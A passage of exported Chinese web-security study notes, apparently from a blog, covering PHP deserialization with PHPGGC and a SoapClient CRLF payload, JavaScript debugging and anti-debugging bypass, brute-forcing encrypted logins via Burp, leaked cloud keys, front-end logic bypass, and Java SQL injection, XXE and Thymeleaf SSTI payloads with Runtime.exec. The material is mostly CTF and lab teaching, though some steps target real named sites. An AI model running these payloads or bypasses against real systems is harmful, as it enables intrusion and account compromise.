再访问flag.txt\n\nO%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A129%3A%22ceshi%0D%0AX-Forwarded-For%3A+127.0.0.1%2C127.0.0.1%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D\n\n&lt;?php$ua = &quot;ceshi\\r\\nX-Forwarded-For: 127.0.0.1,127.0.0.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 13\\r\\n\\r\\ntoken=ctfshow&quot;;$client = new SoapClient(null,array(&#x27;uri&#x27; =&gt; &#x27;http://127.0.0.1/&#x27; , &#x27;location&#x27; =&gt; &#x27;http://127.0.0.1/flag.php&#x27; , &#x27;user_agent&#x27; =&gt; $ua));echo urlencode(serialize($client));?&gt;\n\n\n\n\n\n\n\n\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"062-Web攻防-框架类反序列化项目&分析文章等","url":"/2025/09/16/062-Web%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A1%B9%E7%9B%AE&%E5%88%86%E6%9E%90%E6%96%87%E7%AB%A0%E7%AD%89/","content":"062-Web攻防-框架类反序列化项目&amp;分析文章等\n知识点：\n1、PHP-反序列化-开发框架类项目\n2、PHP-反序列化-Payload生成项目\n3、PHP-反序列化-Payload生成综合项目\n\n反序列化链项目-PHPGGC&amp;NotSoSecure框架类的反序列化及对应POP链编写是非常复杂的。比CTF那种原生态反序列化源码难很多很多。\n利用场景：当知道目标使用了某个框架及对应版本并且这个框架版本曝过反序列漏洞，那么就可以尝试利用该项目去生成反序列链\nNotSoSecure(综合类)项目地址：https://github.com/NotSoSecure/SerializedPayloadGenerator\n\n为了利用反序列化漏洞，需要设置不同的工具，如 YSoSerial(Java)、YSoSerial.NET、PHPGGC 和它的先决条件。DeserializationHelper 是包含对 YSoSerial(Java)、YSoSerial.Net、PHPGGC 和其他工具的支持的Web界面。使用Web界面，您可以为各种框架生成反序列化payload.\n\n\nJava – YSoSerial\nNET – YSoSerial.NET\nPHP – PHPGGC\nPython - 原生\n\n搭建过程PHPGGC(单项类)项目地址：https://github.com/ambionics/phpggc\n\nPHPGGC是一个包含unserialize()有效载荷的库以及一个从命令行或以编程方式生成它们的工具。当在您没有代码的网站上遇到反序列化时，或者只是在尝试构建漏洞时，此工具允许您生成有效负载，而无需执行查找小工具并将它们组合的繁琐步骤。 它可以看作是frohoff的ysoserial的等价物，但是对于PHP。目前该工具支持的小工具链包括：CodeIgniter4、Doctrine、Drupal7、Guzzle、Laravel、Magento、Monolog、Phalcon、Podio、ThinkPHP、Slim、SwiftMailer、Symfony、Wordpress、Yii和ZendFramework等。\n\n反序列化框架利用-ThinkPHP&amp;Yii&amp;Laravel[安洵杯 2019]iamthinking Thinkphp V6.0.X 反序列化网址:https://buuoj.cn/challenges#\n PHPGGC参考：PHPGGC的使用介绍和安装\n\n在此网址下面访问www.zip下载源码 打开编译器进行代码审计 可以看到这里使用的是think6.0版本\n在app - controller - index.php 下有 有反序列化函数unserialize 这里不存在 —wakeup魔术方法\n所以假设网上没有相关漏洞POC给你，但是你知道这个版本的thinkphp存在反序列化，你该怎么办？\n这里使用phpggc帮助我们生成一个thinkphp反序列化利用链\n\n\n使用phpggc -l thinkphp列出关于针对thinkphp框架的可选项\nThinkPHP&#x2F;FW1（FW指的是文件写入，意思就是利用反序列化漏洞进行文件写入）\nversion是（漏洞版本区间）\n\n\n这里thinkphp漏洞框架是6.0所以使用rce3生成payload phpggc ThinkPHP/RCE3 system &#39;cat /flag&#39;  \n**命令语法：**执行程序 框架名字 要执行的函数 具体的命令 什么编码格式\n如果对payload进行编码一定要在phpggc里面进行编译否则会出问题\n\n\n将构造好的payload进行利用 拿到flag\n\n\n\n\n\n\n \n\n\n\n\nCTFSHOW - 267\n先进行账号登录 账号admin 密码admin\n在about下面有源码泄露 GET：index.php?r=site%2Fabout&amp;view-source\n&#x2F;&#x2F;&#x2F;backdoor&#x2F;shell下code传参进行base64编码 在进行反序列化\n右键查看源码可以看到是yii框架 点击可以看到此版本为2.0\n打开phpggc 生成代码phpggc Yii/RCE2 exec &#39;cp /fla* tt.txt&#39; --base64防止出现不回显情况 \n传入后门拿到flag\n\n\n\n\n\n\n\n\n\nCTFSHOW - 271\n从代码可知 这里使用的是Laravel 并且使用post传参\n\n这里没有进行base64编码所以我们直接用url编码\n\n成功查看当前用户是root 再生成查看cat /fla*拿到flag\n\n\n\n\n\n\n\n\n\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"063-Web攻防-JS断点调试&Burp插件模块等","url":"/2025/09/16/063-Web%E6%94%BB%E9%98%B2-JS%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95&Burp%E6%8F%92%E4%BB%B6%E6%A8%A1%E5%9D%97%E7%AD%89/","content":"063-Web攻防-JS断点调试&amp;Burp插件模块等\n知识点\nJS分析调试知识点：\n1、JavaScript-作用域&amp;调用堆栈2、JavaScript-断点调试&amp;全局搜索3、JavaScript-Burp算法模块使用\n\nJavaScript-作用域&amp;调用堆栈\n前置知识\n作用域：（本地&amp;全局）\n\n简单来说就是运行后相关的数据值\n\n\n调用堆栈：（由下到上）\n\n简单来说就是代码的执行逻辑顺序\n\n\n\n常见分析调试方式\n\n代码全局搜索：通过抓包参数名进行代码全局搜索\n文件流程断点：审查元素抓网络请求包发起程序\n代码标签断点：审查元素对应标签按钮加入断点\nXHR提交断点：审查元素源代码加入XHR断点配置\n\n\n学习JS分析调试作用\n\n针对JS开发应用\n密码登录枚举爆破  \n参数提交漏洞检测\n泄漏URL有更多测试\n\n\n数据加密对安全测试的影响：因为服务端接收到数据的时候会对该数据进行解密处理，如果用户提交的数据没有进行加密而是直接以明文方式传输给服务端，服务端在对这个明文进行解密操作得出来的就是一串乱码，无论用户密码是否正确肯定都会失败。\nCTRL+SHIFT+I：进入浏览器开发者模式\n\n\n\nJavaScript-断点调试&amp;全局搜索全局搜索测试域名：https://my.sto.cn/\n\n如果网站数据是通过js传输的，那么就需要有请求的路径包含在js代码里。通过寻找登录的数据包，找到登录时请求的url地址，在js代码中全局搜索，加密的代码就在上面的代码里\n\n在首页进行登录 查看数据包 发现 这里对我们的用户名 手机号 密码均进行了加密 从安全测试的角度来说 这对我的爆破 以及枚举来说是非常不利的 我们要在js里面查找有没有加密的方式\n\n\n第一种方式 在标头这搜索路径 CTRL+SHIFT+F对路径关键字进行搜索往上翻找到了加密传参的地方  如果直接调用加密会显示没有声明 我们还需要找到他的声明方式  \n\n\n\n\n\n\n\n\n\n找到调用的地方 尝试控制台调用 在进行加密 最后加密成功\n\n\n\n\n\n\n\n\n文件流程断点：审查元素抓包网络请求包发起程序\n\n在网络里面的发起程序或者启动器里面可以看到请求调用堆栈 在LoginResult请求参与的时候有哪些文件进行抓包  按照上面的图片的逻辑顺序来说我们应该重点看ajax和login这两个地方的js 因为这里是对数据逻辑进行加密可能出现的地方\n\n请求调用堆栈：的调用逻辑是从下向上执行\n\n\n\n\n\n我们在这里进行断点 并且重新登录 浏览器进行暂停 在logindata这里鼠标放上去 发现我们的账户密码 已经加密  右边的几个箭头 可以对函数进行操作这里不用这个\n\n作用域这里显示的是logindata里面的数据 在numcode和nummobile这里还没有进行加密 但是在logindata这里已经进行加密了\n在调用堆栈这里可以查看数据的操作变化 调用堆栈的执行顺序是从下往上用过鼠标点击 在匿名和login这里发现对我们传入的数据进行了加密 ctrl单击进行了发现就已经对进行了执行\nlogindata在这里已经加密完成了 所以我们要重点找这个在哪里出现看看有没有什么关键字 \n从encrypt这里找到了加密算法的来源文件 在和刚刚全局搜索一样操作了\n\n\n\n\n\n\n\n\n\n\n标签断点\n在登录界面进行f12 选中登陆框 找到事件 选中 右键选择发生中断条件 选中属性修改\n点击登录后即可进行断点\n\n\n\n\nXHR断点\n先进行登录 在网络这里我们发现它的类型是xhr\n在网络这里 选中其中具有代表性的地址 这里是Vip/LoginResult\n在源代码里面  点击top 在xhr&#x2F;提取断点哪里点击 加号 将刚刚的路径填进去 这里浏览器监控请求到我们添加的路径的时候进行断点 \n点击登录在send进行了断点 然后在作用域和调用堆栈哪里进行分析 思路跟上面一样\n\n\n\n\n\n\n\n案例演示https://account.hpc.sjtu.edu.cn/#/login\n\n这里使用文件断点 进行登录 在f12在网络这里 启动器找到请求调用堆栈 在value这里点进去 在login这里进行断点 \n在这一步中，a 是需要加密的原始数据（例如用户密码）。调用 encrypt 方法后，a 被公钥加密，生成加密后的字符串 这里o是我们进行的密钥\n到控制台调用 加密成功 找到js的加密文件 负责里面的代码 到js在线执行平台上面 替换C.RSACODE为具体的密钥 打印执行\n\n\n\n\n\n\n\n\nJavaScript-Burp算法模块使用\n下载phantomjs 将目录复制 粘贴到环境变量里面记得重启\n\n项目地址：https://phantomjs.org/download.html \n\n粘贴完成后输入phantomjs进入\n\n\n\n\n\n\n\n打开burpsuite  在Extensions哪里加载jsEncrypter插件 选中你插件的路径\n\n项目地址：https://github.com/c0ny1/jsEncrypter/releases\n\n\n\n\n\n对逆向的加密算法提取JS文件及代码\n\n在前面断点的地方 找到JS加密方式 将里面的内容另存为文件 放在插件目录jsEncrypter.0.3.2里面\n\n打开目录里面的phantomjs_server.js文件 将文件里面的xxx.js名字修改为刚刚保存算法文件名的JSEncrypt.js\n\n讲代码写入到模版中（引用JS和调用加密）编写调用加密函数进行加密的代码\n\n\n   var wasSuccessful = phantom.injectJs(&#x27;JSEncrypt.js&#x27;);  //引用js //调用加密代码function encrypt(password)&#123;\tvar r = new JSEncrypt;\to = &quot;xxxxxxxxx&quot;;    r.setPublicKey(o);    var s = r.encrypt(password)\treturn s;&#125; // 处理函数(不要把调用加密代码直接写进去，容易卡死，单独写一个调用加密函数)function js_encrypt(payload)&#123;\tvar newpayload;\t/**********在这里编写调用加密函数进行加密的代码************/\tvar newpayload=encrypt(payload);\t/**********************************************************/\treturn newpayload;&#125;\n\n\n运行刚写入的模版文件后插件连接测试phantomjs xxxxx.js\n\n正常对登录进行抓包 选中密码 在爆破模块添加字典 \n\n在payload processing里面add - Invoke burp extension：jsEncrypter 加载插件\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"064-WEB攻防-JS应用&反调试分析&代码混淆&AST加密还原&本地覆盖&断点条件","url":"/2025/09/16/064-WEB%E6%94%BB%E9%98%B2-JS%E5%BA%94%E7%94%A8&%E5%8F%8D%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90&%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86&AST%E5%8A%A0%E5%AF%86%E8%BF%98%E5%8E%9F&%E6%9C%AC%E5%9C%B0%E8%A6%86%E7%9B%96&%E6%96%AD%E7%82%B9%E6%9D%A1%E4%BB%B6/","content":"064-WEB攻防-JS应用&amp;反调试分析&amp;代码混淆&amp;AST加密还原&amp;本地覆盖&amp;断点条件知识点\n\n1、JavaScript-反调试&amp;方法&amp;绕过2、JavaScript-代码混淆&amp;识别&amp;还原\n\nJS反调试程序加入反调试：实现防止他人调试、动态分析自己的代码\n检测调试方法：\n\n键盘监听（F12）\n检测浏览器的高度插值\n检测开发者人员工具变量是否为true\n利用console.log调用次数\n利用代码运行的时间差\n利用toString\n检测非浏览器\n\n常见绕过方法：\n\n禁用断点法\n条件断点法\n此处暂停法\n置空函数法\n本地覆盖法\n\n简单案例：咸鱼解析平台键盘摁下：CTRL+SHIFT+I 或者 F12 就会调出开发者工具 但是此刻网站无法播放视频 也无法对网站的流量进行抓包 得关掉开发者工具才行\n\n\n\n禁用断点法\n打开开发者工具 在右边这里点击禁止断点 \n\n优点：浏览器即可正常播放视频 数据包也正常运行\n\n缺点：一旦启用禁用断点 不能在进行断点了\n\n\n\n\n\n\n\n\n条件断点法\n鼠标有点编辑断点  添加条件为flase 让这个禁用的函数为假 即可绕过\n\n\n\n\n\n此处暂停法\n这个跟上面有点类似 在debug这里右键选择永不再此处暂停\n\n\n\n\n置空函数法\n这个感觉更像是结合 使用禁用断点法 让网站的流量包正常显示 \n然后在网络包里面找debugger禁用断点的函数 出现的地方\n然后在控制台这里 重写函数 将里面的内容置空 让函数没有内容执行即可绕过 也称 hook技术\n\n\n\n\n\n\n本地覆盖法\n打开点击有键发现鼠标给禁用 在页面f12多按几次即可进入开发者工具\n使用禁用断点法 让数据包正常显示在开发者工具栏里面 全局搜索关键字 检测到非法调试 dndebug里面出现过\n这两个文件里面出现endebug \n在浏览器源代码这里 覆盖这里 新建一个文件 名为aqistudy 将代码保存在我们背地替换的文件里面  让浏览器背地访问加载代码 \n在这里拉到出现endubug过滤代码那里直接注释掉 另一个文件也是 注释完后刷新即可正常调试打断电了\n\n\n\n\n\n\n\n\n\n\nJS逆向-混淆加密-识别&amp;还原\n代码混淆加密：上述几种方法，已经达到了反调试的效果，但如果他人查看代码，也可能被找出检测功能并删去。为了防止反调试功能被剔除，我们可以对JS代码进行混淆加密。\n\n开源代码混淆解密平台：JJEncode AAEncode JSFuck\nhttps://www.sojson.com/\nAAEncode加密function xiaodi()&#123;console.log(&#x27;hello xiaodi!&#x27;)&#125;xiaodi();\n\n\n\nJSfuck加密\n将加密后的代码放进控制台正常输入结果 \n将最后一段去掉暴露源码\n\n\n\n\n\n\n\n商业混淆解密地址: [阳江钓鱼频道][https://www.eisk.cn/]\nhttps://www.jsjiami.com/ \n\n如何解密还原？前提：知道对方使用了什么加密\nhttps://jsdec.js.org/ 解密网站\n\n复制里面的代码 丢进解密网站 \n可以先进行自动识别 然后在选择性的解密方式解密\n在网站里面找到一些js文件解密后使用了AES加密\n\n\n\n\n\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"065-Web攻防-JS安全&浏览器插件&工具箱等","url":"/2025/09/16/065-Web%E6%94%BB%E9%98%B2-JS%E5%AE%89%E5%85%A8&%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8F%92%E4%BB%B6&%E5%B7%A5%E5%85%B7%E7%AE%B1%E7%AD%89/","content":"065-Web攻防-JS安全&amp;浏览器插件&amp;工具箱等知识点\n\nJS 安全-泄漏配置-SK&amp;AK 利用JS 安全-前端逻辑-代码验证机制JS 安全-前端接口-未授权&amp;接口提交\n\n在 Javascript 中也存在变量和函数，当存在可控变量及函数调用即可参数漏洞。JS开发应用和 PHP，JAVA 等区别在于即没源代码，也可通过浏览器查看源代码。获取 URL，获取 Js 敏感信息，获取代码传参等，所以相当于 JS 开发的 WEB应用属于白盒测试，一般会在JS中寻找更多 URL地址，(加密算法，APIkey配置，验证逻辑，框架漏洞等)进行后期安全测试\njavascrpt 开发的网站应用所面临的问题\n1.会增加攻击面(URL、接口，分析调试代码逻辑)\n2.敏感信息(用户密码、ak&#x2F;sk、token&#x2F;session)\n3.潜在危险函数(eval、dangerallySetInnerHTML)\n4.开发框架类(寻找历史漏洞 Vue、NodeJs、Angular等\nJS 安全-泄漏配置-SK&amp;AK 利用\n在网站下面吗打开开发者工具选项 在网络下面的的upload.js 响应包里面 发现暴露了 accessid和accesskey\n在One-fox工具箱里面AK利用工具 根据提示填写内容\n配置成功后即可拿到云服务器上面的相关内容\n\n\n\n\n\n\n\nJS 安全-前端逻辑-代码验证机制\n这里输入错误的账号密码验证 提示错误 我们返回标头 对请求路径的关键字进行全局搜索\n\n在全局搜索里 55文件里面看到了验证逻辑 显示200为验证成功 我们使用burp抓包修改验证逻辑\n\n根据js验证逻辑 将抓包的206改为200 成功跳转密码重置界面\n\n我们继续修改重置密码会跳转 流程错误请重试 我们在标头的路径进行关键全局搜索\n\n找到js验证逻辑 显示200 密码验证成功\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n在忘记密码的环节属于第一种情况  就是在js前端验证但是服务器什么都没做\n在重置密码环境 是第二种情况虽然服务器做了数据判断 返回成功结果 但是返回后的逻辑依旧是JS判断\n怎么分析js代码逻辑？\n用关键字  参数名 和url地址进全局搜索 得到代码段 然后进行断点调式\n\n\n\n\n\nJS 安全-前端接口-未授权&amp;接口提交\n使用插件 在路径地址这里发现一个&#x2F;log&#x2F;log&#x2F;地址 尝试进行登录\n进入他的后台管理页面 \n插件还有显示接口路径地址 \n\n\n\n\n\n\nJS 安全-框架漏洞-Pentestkit 插件检测","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"066-Web攻防-Java安全JAR包靶场&审计源码等","url":"/2025/09/16/066-Web%E6%94%BB%E9%98%B2-Java%E5%AE%89%E5%85%A8JAR%E5%8C%85%E9%9D%B6%E5%9C%BA&%E5%AE%A1%E8%AE%A1%E6%BA%90%E7%A0%81%E7%AD%89/","content":"066-Web攻防-Java安全JAR包靶场&amp;审计源码等知识点\n1、Java安全-SQL注入-JDBC&amp;MyBatis\n2、Java安全-XXE注入-Reader&amp;Builder\n3、Java安全-SSTI模版-Thymeleaf&amp;URL\n4、Java安全-SPEL表达式-SpringBoot框架\nJavaSec搭建项目下载地址：https://github.com/bewhale/JavaSec\n具体搭建请参考：https://blog.csdn.net/qq_61553520/article/details/136767473\n默认账户密码admin&#x2F;admin\n\n使用java -jar javasec-0.0.1-SNAPSHOT.jar启动靶场 成功之后会跳出如下信息 \n\n\n\n\n访问地址http://127.0.0.1:8000/ 账户名密码均为admin\n\n\n\n\n\n\nHello-Java-Sec搭建项目下载地址：https://github.com/j3ers3/Hello-Java-Sec\n具体搭建请参考：https://blog.csdn.net/qq_61553520/article/details/136767473\n使用java -jar javasec-1.10.jar启动靶场环境\n如果安装了高本吧的jkd不想切换版本可以使用 在靶场目录下使用这段如果不行还是建议安装1.8的JDK\n默认账户密码admin&#x2F;admin\n\njava --add-exports java.naming/com.sun.jndi.ldap=ALL-UNNAMED -jar javasec-1.10.jar\n* ![image-20250627151322462](/img/image-20250627151322462.png)## Java安全-SQL注入Java操作数据库的三种方式：JDBC，[MyBatis](https://so.csdn.net/so/search?q=MyBatis&amp;spm=1001.2101.3001.7020)，Hibernate* -Hibernate  * Hibernate是一个Java持久化框架，它提供了一种将对象映射到关系数据库表的机制。通过Hibernate，开发人员可以使用面向对象的方式来操作数据库，而不需要编写复杂的SQL语句。  * Hibernate的核心思想是对象关系映射（Object-Relational Mapping，ORM），它将Java对象和数据库表之间建立了映射关系，使开发人员可以通过操作Java对象来实现对数据库的操作，而无需直接操作SQL语句。  * Hibernate提供了一系列的API和工具，用于处理对象的持久化、查询、缓存和事务管理等方面。它还提供了一个强大的查询语言HQL（Hibernate Query Language），类似于SQL语法，但更加面向对象。  * 使用Hibernate可以简化开发过程，提高效率，并且具有良好的跨数据库兼容性。它是Java开发中最流行的ORM框架之一，被广泛应用于企业级应用程序的开发中。  * Hibernate作为一个成熟的框架，在安全性方面表现良好，并且经过了广泛的安全测试和修复。* -JDBC  * 采用Statement方法拼接SQL语句  * PrepareStatement会对SQL语句进行预编译，但如果直接采取拼接的方式构造SQL，此时进行预编译也无用。  * JDBCTemplate是Spring对JDBC的封装，如果使用拼接语句便会产生注入    * 安全写法：SQL语句占位符（?） + PrepareStatement预编译* -MyBatis  * MyBatis支持两种参数符号，一种是#，另一种是$，#使用预编译，$使用拼接SQL。  * order by注入：由于使用#&#123;&#125;会将对象转成字符串，形成order by &quot;user&quot; desc造成错误，因此很多研发会采用$&#123;&#125;来解决，从而造成注入.  * like 注入：模糊搜索时，直接使用&#x27;%#&#123;q&#125;%&#x27; 会报错，部分研发图方便直接改成&#x27;%$&#123;q&#125;%&#x27;从而造成注入.  * in注入：in之后多个id查询时使用 # 同样会报错，从而造成注入.### JDBCJava语言连接数据库操作SQLI(SQL Injection)， SQL注入是因为程序未能正确对用户的输入进行检查，将用户的输入以拼接的方式带入SQL语句，导致了SQL注入的产生。攻击者可通过SQL注入直接获取数据库信息，造成信息泄漏。**JDBC有两个方法执行SQL语句，分别是PrepareStatement和Statement。**1. **采用Statement方法拼接SQL语句(没有预编译)**   * ![image-20250627153514203](/img/image-20250627153514203.png)   * ![image-20250627153639097](/img/image-20250627153639097.png)2. **PrepareStatement会对SQL语句进行预编译，但如果直接采取拼接的方式构造SQL，此时进行预编译也无用。**   * ![image-20250627154042827](/img/image-20250627154042827.png)   * ![image-20250627154523586](/img/image-20250627154523586.png)3. **JDBCTemplate是Spring对JDBC的封装，如果使用拼接语句便会产生注入**   * ![image-20250627154604700](/img/image-20250627154604700.png)&gt; 安全写法：SQL语句占位符（?） + PrepareStatement预编译&gt;&gt; 事实证明，最框架的不安全使用会造成[SQL注入漏洞](https://so.csdn.net/so/search?q=SQL注入漏洞&amp;spm=1001.2101.3001.7020)&gt;&gt; 大型网站不用想，小型网站有测试的价值### **MyBatis** mybatis是一个优秀的基于java的持久层框架,它内部封装了 jdbc1. MyBatis支持两种参数符号，一种是#，另一种是$，**#使用预编译，$使用拼接SQL。（造成注入原因也是因为使用了$进行拼接）**   * ![image-20250627155323820](/img/image-20250627155323820.png)2. **order by 造成SQL注入**：由于使用#&#123;&#125;会将对象转成字符串，形成order by \\“user”\\ desc造成错误，因此很多研发会采用$&#123;&#125;来解决，从而造成注入   * ![image-20250627155707876](/img/image-20250627155707876.png)3. **like 注入**：模糊搜索时，直接使用’%#&#123;q&#125;%’ 会报错，部分研发图方便直接改成’%$&#123;q&#125;%&#x27;从而造成注入.   * ![image-20250627165415070](/img/image-20250627165415070.png)4. **in注入**：in之后多个id查询时使用 # 同样会报错，从而造成注入.   * ![image-20250627165434505](/img/image-20250627165434505.png)   **白盒审计**在真实情况下，需要先分析源码里用了那种方式操作数据库(JDBC还是MyBatis)，然后在针对性看代码写法，JDBC如果没用到安全写法，那么就容易出现问题。MyBatis看代码用了$还是#，#号就可以不用看了，$符号就看是不是在order by、like、in里面，在就恭喜了### 代码审计案例：inxedu后台MyBatis注入搭建详情参考：https://blog.csdn.net/qq_61553520/article/details/136767473* ![image-20250627193954316](/img/image-20250627193954316.png)* 使用phpstudy 5.5的数据库 导入网站的sql文件* &lt;img src=&quot;/img/image-20250627174620696.png&quot; alt=&quot;image-20250627174620696&quot; style=&quot;zoom:50%;&quot; /&gt;* 配置好端口地址点击右上角当前文件 —— 选择编辑配置信息——点击**+**号 ——选择tomcat本地* &lt;img src=&quot;/img/image-20250627175521669.png&quot; alt=&quot;image-20250627175521669&quot; style=&quot;zoom:50%;&quot; /&gt;* 这里需要配置tomcat 没有的具体参考:https://blog.csdn.net/rej177/article/details/126135033* ![image-20250627194211168](/img/image-20250627194211168.png)* &lt;img src=&quot;/img/image-20250627181159792.png&quot; alt=&quot;image-20250627181159792&quot; style=&quot;zoom:50%;&quot; /&gt;* &lt;img src=&quot;/img/image-20250627194041299.png&quot; alt=&quot;image-20250627194041299&quot; style=&quot;zoom:50%;&quot; /&gt;* 如果报错在项目——项目结构这里选择你所下载的JDK* ![image-20250627181412024](/img/image-20250627181412024.png)* 如果打开报错显示404* ![image-20250627181630632](/img/image-20250627181630632.png)* ![image-20250627194306981](/img/image-20250627194306981.png)* ![image-20250627194342258](/img/image-20250627194342258.png)1. 常规黑盒测试在url后面直接进行测试   * ![image-20250627200430017](/img/image-20250627200430017.png)2. 白盒测试看项目的`引用库`和`pron.xml`   * &lt;img src=&quot;/img/image-20250627200630863.png&quot; alt=&quot;image-20250627200630863&quot; style=&quot;zoom:50%;&quot; /&gt;3. 从引用库里面看到有用到`mybatis`猜测有用到`mybatis`的数据操作   * &lt;img src=&quot;/img/image-20250627200731492.png&quot; alt=&quot;image-20250627200731492&quot; style=&quot;zoom:33%;&quot; /&gt;4. 在白盒审计里面如果使用到mybatis数据库产生了SQL注入要想到在代码里面是否使用了这个三个`$&#123;`、`%$&#123;`、`($&#123;`写法   * ![image-20250627201935222](/img/image-20250627201935222.png)5. 返回源代码 ctrl+shift+f 在文件里面全局查找是否有这三种写法的方式   * 可以看到在第三个这里有个xml文件出现了这种写法是点击去看发现是早删除文件模块 我们查看在文件里面有谁调用了`eleteArticleByIds`     * ![image-20250627202643424](/img/image-20250627202643424.png)6. 在第二个xml控制器文件调用了`eleteArticleByIds`操作，根据文件名称推测是这个 点进去查看   * &lt;img src=&quot;/img/image-20250627203352296.png&quot; alt=&quot;image-20250627203352296&quot; style=&quot;zoom:50%;&quot; /&gt;7. 点击进去发现路径是/delete 根据上面文件顶部的主类看到sql注入的地方在文件后台管理页面的`/admin/article`下面，这里我们登录后台管理页面查看   * ![image-20250627204003659](/img/image-20250627204003659.png)   * ![image-20250627203540978](/img/image-20250627203540978.png)8. 后台管理路径是/admin 账户名是admin 密码是111111   * ![image-20250627203758206](/img/image-20250627203758206.png)9. 来到后台界面没有admin/article界面猜测是在文件咨询管理这里的删除功能产生了注入   * f12打开开发者模式 删除文章     * ![image-20250627204158058](/img/image-20250627204158058.png)     * 这里看到请求地址是/article/delete 请求载荷是23 符合上面的delete的路由地址，并且articelld符合上面的值所以这里有sql注入       * ![image-20250627204535164](/img/image-20250627204535164.png)       * ![image-20250627204740030](/img/image-20250627204740030.png)10. 把删除文章这里的流量包复制到本地文件进行抓包丢进sqlmap测试    * ![image-20250627205202284](/img/image-20250627205202284.png)      11. 发现这里有注入点    * ![image-20250627205533613](/img/image-20250627205533613.png)## Java安全-XXE注入-Reader&amp;BuilderXXE  ( XML  External Entity Injection ),  XML外部实体注入，当开发人员配置其XML解析功能允许外部实体引用时，攻击者可利用这一可引发安全问题的配置方式，实施任意文件读取、内网端口探测、命令执行、拒绝服务等攻击。XML（可扩展标记语言）是一种用于表示和传输结构化数据的标记语言。它被设计成具有可读性强且可扩展的特点，常用于在不同系统之间进行数据交换和存储。XML使用标签来描述数据的结构和含义。每个XML文档都由标签和内容构成，标签用于标识数据的元素，而内容则是元素的具体值或子元素。标签可以嵌套，形成层次结构，以便表示复杂的数据关系.在代码审计时需要审计这些XML处理函数，这是一些与XML处理相关的类和接口的列表。它们通常在编程语言中的XML解析库或API中使用，用于读取、解析、转换和处理XML数据。**黑盒测试**详情参考这个黑盒测试：https://blog.csdn.net/m0_51345235/article/details/131503666**白盒—审计函数**- 判断是否开启XML外部实体解析- 全局搜索关键类的名字，看看有没有参数可控XMLReader：用于顺序读取XML文档的内容，并提供了一种基于事件的方式来处理XML数据。SAXReader：一种用于读取和解析XML文档的SAX（Simple API for XML）解析器。DocumentBuilder：用于创建DOM（Document Object Model）对象的接口，可以将XML文档加载到内存中进行操作。XMLStreamReader：一种用于读取和解析XML文档的StAX（Streaming API for XML）解析器。SAXBuilder：用于构建SAX解析器的类，用于读取和解析XML文档。SAXParser：一种用于解析XML文档的SAX解析器。SAXSource：用于将SAX事件作为输入源的对象，可以用于将SAX解析器与其他处理器（如XSLT转换器）进行连接。TransformerFactory：用于创建Transformer对象的工厂类，可以将XML文档进行转换、处理和生成。SAXTransformerFactory：用于创建SAXTransformerHandler对象的工厂类，可以在SAX事件处理期间进行XML转换和处理。SchemaFactory：用于创建XML Schema验证器的工厂类，可以用于验证XML文档的结构和内容。Unmarshaller：用于将XML文档解组为Java对象的接口，通常与Java的XML绑定技术（如JAXB）一起使用。XPathExpression：用于执行XPath查询的接口，可以在XML文档中查找和选择特定的元素和属性。## Java安全-SSTI模版-Thymeleaf&amp;URLSSTI(Server Side Template Injection) 服务器模板注入, **服务端 **将用户输入直接作为模板内容或模板变量渲染**，但没有做好过滤和控制，导致用户可以构造恶意表达式，从而执行危险操作**1. URL作视图2. Thymeleaf3. Velocity**常见模板引擎有：**- Python：Jinja2、Tornado、Mako- Java：FreeMarker、Velocity、Thymeleaf- PHP：Smarty、Twig- Node.js：EJS、Pug其他语言参考：https://www.cnblogs.com/bmjoker/p/13508538.html有时间学学正则表达式;https://www.jyshare.com/front-end/854/1. **URL作视图**   * &gt; 原理： 根据spring boot定义，如果controller无返回值，则以GetMapping的路由为视图名称，即将请求的url作为视图名称，调用模板引擎去解析，在这种情况下，我们只要可以控制请求的controller的参数，一样可以造成RCE漏洞     * ```        * payload: __$&#123;T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)&#125;__::.x\n\n   * ```\n      @GetMapping(&quot;/doc/&#123;document&#125;&quot;)\n      public void getDocument(@PathVariable String document) &#123;\n          System.out.println(document);\n      &#125;\n          * &lt;img src=&quot;/img/image-20250627220213557.png&quot; alt=&quot;image-20250627220213557&quot; style=&quot;zoom:50%;&quot; /&gt;2. #####  thymeleaf模版注入   * ```     payload:__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%27calc%27).getInputStream()).next()%7d__::.x\n\n * ```\n    @GetMapping(&quot;/thymeleaf/vul&quot;)\n    public String thymeleafVul(@RequestParam String lang) &#123;\n        // 模版文件参数可控\n        return &quot;lang/&quot; + lang;\n    &#125;\n\n\n\n\n          * ![image-20250627222415425](/img/image-20250627222415425.png)#### **黑盒测试角度**STTI：信息收集网站模板信息，或者网页f12打开看网页注释查看代码里面有没有透露当前网站使用的是那个模板然后对一些功能点进行测试STTI模板测试点1. 模板渲染时直接拼接用户输入   * &gt; 比如开发者直接把用户的输入“拼”进模板语法，而不是通过安全的方式传值：2. 后台管理系统的“自定义模板功能”   * &gt; 